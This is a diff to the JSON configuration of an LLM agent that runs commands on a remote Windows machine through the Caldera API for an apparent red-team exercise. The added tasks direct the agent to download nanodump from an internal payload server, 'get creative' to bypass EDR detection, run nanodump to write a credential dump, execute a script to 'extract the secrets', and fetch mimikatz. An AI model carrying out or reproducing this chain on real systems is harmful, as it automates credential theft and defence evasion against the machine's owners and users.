@@ -4,12 +4,13 @@
     "goal": "Interact with the Caldera API to extract information & perform actions on the Caldera platform. NEVER invent data as part of your answer, only use the data provided by the API.",
     "backstory": "You are an agent responsible for interacting with a remote computer through the Caldera API. You need to run commands on the system in order to reach certain Red Teaming objectives.",
     "tools": [
-        "caldera_execute_command_on_agent_tool"
+        "caldera_execute_command_on_agent_tool",
+        "website_search_tool"
     ],
     "tasks": [
         {
             "ID": "simulate_user_action_task",
-            "description": "User powershell to perform an action on the system that resembles the actions of an accountant. Run commands like using a browser, creating files, etc. Please get creative and do not use test names like 'test.txt' or 'test.xlsx' but names that look realistic. If you create a file, make sure to only place them on the Desktop.",
+            "description": "User powershell to perform an action on the system that resembles the actions of an accountant. Run commands like using a browser, creating files, etc. Please get creative and do not use test names like 'test.txt' or 'test.xlsx' but names that look realistic. If you create a file, make sure to only place them in C:/temp.",
             "expected_output": "The output of the command with a summarized analysis. Clearly indicate if the command was successfully executed or not."
         },
         {
@@ -38,13 +39,23 @@
             "expected_output": "The output of the command that was run."
         },
         {
+            "ID": "demo_facts_task",
+            "description": "The tool we want to use in the next tasks is called nanodump. Documentation is at https://raw.githubusercontent.com/fortra/nanodump/main/README.md",
+            "expected_output": "The link to the documentation page"
+        },
+        {
+            "ID": "lookup_tool_documentation_on_github_task",
+            "description": "Use the web search tool to look up the documentation for tool mentioned in the previous task.",
+            "expected_output": "The output with a clear overview of all the command line options available for the tool. Do not include the full documentation, only the command line options that are available, with a short explanation of each option."
+        },
+        {
             "ID": "caldera_download_payload_task",
-            "description": "Run powershell to download the payload at http://192.168.162.11:8000/payloads/nanodump.x64.exe and validate if the downloaded executable exists to ensure download was successful by chaining the download with a Test-Path command, but ALWAYS wait 5 seconds before running the Test-Path command, this is very important. Do NOT try the same commands that you ran before, by analyzeing the task history, if one is present in the backstory. If the file does not exist, the command was not successfully executed. ALWAYS combine the file download & the Test-Path check in a single command. Try to get creative in how you download the payload, as we are running this as part of an authorized Red Team, and we want to bypass EDR detections.",
+            "description": "Run powershell to download the payload at http://192.168.162.11:8000/payloads/nanodump.x64.exe to C:/temp, and validate if the downloaded executable exists to ensure download was successful by chaining the download with a Test-Path command, but ALWAYS wait 5 seconds before running the Test-Path command, this is very important. Do NOT try the same commands that you ran before, by analyzeing the task history, if one is present in the backstory. If the file does not exist, the command was not successfully executed. ALWAYS combine the file download & the Test-Path check in a single command. Try to get creative in how you download the payload, as we are running this as part of an authorized Red Team, and we want to bypass EDR detections.",
             "expected_output": "The output of the command with a summarized analysis. Clearly indicate if the command was successfully executed or not."
         },
         {
             "ID": "caldera_execute_payload_task",
-            "description": "Run powershell to execute the payload that was downloaded in the previous step using the arguments nanodump.x64.exe --fork --valid --write dump.txt",
+            "description": "Use PowerShell to execute 'c:\temp\nanodump.x64.exe'. Look up the right command line arugments to use to successfully write the output to a dump file in the C:\temp directory. Avoid reading LSASS directly. You are ONLY successfull if you managed to successfully write the output to a dump file using the Caldera API.",
             "expected_output": "The output of the command with a summarized analysis. Clearly indicate if the command was successfully executed or not"
         },
         {
@@ -58,9 +69,14 @@
             "expected_output": "The output of the command with a summarized analysis. Clearly indicate if the command was successfully executed or not. Be very strict on this: if the output shows for example instructions on how to use pwoershell, or any exit code that indicates non successfull execution, then your answer should be that the command was not successfully executed. If the command output is empty, then you should also indicate that the command was not successfully executed."
         },
         {
-            "ID": "caldera_summarize_task",
-            "description": "Summarize the actions that were performed in the previous steps by reading the action log.",
-            "expected_output": "A summary of the actions that were performed in the previous steps."
+            "ID": "caldera_execute_more_task",
+            "description": "Use PowerShell to run the proposed python script to extract the secrets.",
+            "expected_output": "The output of the command with a summarized analysis. Clearly indicate if the command was successfully executed or not"
+        },
+        {
+            "ID": "download_mimikatz_task",
+            "description": "Use powershell to download the latest release of mimikatz to C:\temp. Look for the right URL to download by seaching on the relases page of the github repository. Then send a command to Caldera to download the latest release to the C:/temp folder",
+            "expected_output": "The output of the command with a summarized analysis. Clearly indicate if the command was successfully executed or not."
         }
     ]
 }
